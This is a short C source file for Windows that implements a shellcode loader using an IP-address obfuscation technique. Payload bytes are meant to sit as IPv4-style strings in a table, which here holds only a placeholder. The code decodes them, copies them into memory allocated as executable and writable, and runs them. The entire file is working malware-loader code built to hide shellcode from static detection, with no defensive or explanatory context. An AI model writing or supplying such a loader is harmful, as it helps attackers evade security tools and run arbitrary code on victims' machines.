#include <windows.h>

const char* ip_table[] = { /* <shellcode> */ };

const unsigned int IP_COUNT = sizeof(ip_table) / sizeof(ip_table[0]);
const unsigned int SHELLCODE_SIZE = 324;

void ip_decode(unsigned char* out, unsigned int out_len) {
    unsigned int idx = 0;
    for (unsigned int i = 0; i < IP_COUNT && idx < out_len; i++) {
        const char* p = ip_table[i];
        unsigned int val = 0;
        unsigned int oct = 0;
        while (*p && oct < 4 && idx < out_len) {
            if (*p >= '0' && *p <= '9') {
                val = val * 10 + (unsigned int)(*p - '0');
            } else if (*p == '.') {
                out[idx++] = (unsigned char)val;
                val = 0;
                oct++;
            }
            p++;
        }
        if (oct < 4 && idx < out_len) {
            out[idx++] = (unsigned char)val;
        }
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    unsigned char buf[SHELLCODE_SIZE];
    ip_decode(buf, SHELLCODE_SIZE);
    void *exec = VirtualAlloc(0, SHELLCODE_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    unsigned char* dst = (unsigned char*)exec;
    for (unsigned int i = 0; i < SHELLCODE_SIZE; i++) dst[i] = buf[i];
    ((void(*)())exec)();
    return 0;
}
